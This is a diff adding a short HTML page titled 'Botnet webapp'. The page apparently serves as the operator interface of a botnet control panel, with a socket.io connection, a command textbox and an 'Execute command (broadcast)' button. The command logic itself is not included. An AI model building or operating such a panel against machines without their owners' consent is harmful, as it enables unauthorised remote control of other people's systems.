@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<title>Botnet webapp</title>
+		<script src="/socket.io/socket.io.js"></script>
+		<script src="/script" charset="utf-8"></script>
+		<style>
+			textarea {
+				font-family: monospace;
+			}
+		</style>
+	</head>
+	<body>
+		<h1>Execute command (broadcast)</h1>
+		<textarea id="command" cols="80" rows="1"></textarea>
+		<br>
+		<button onclick="executeCommand()">Execute</button>
+	</body>
+</html>
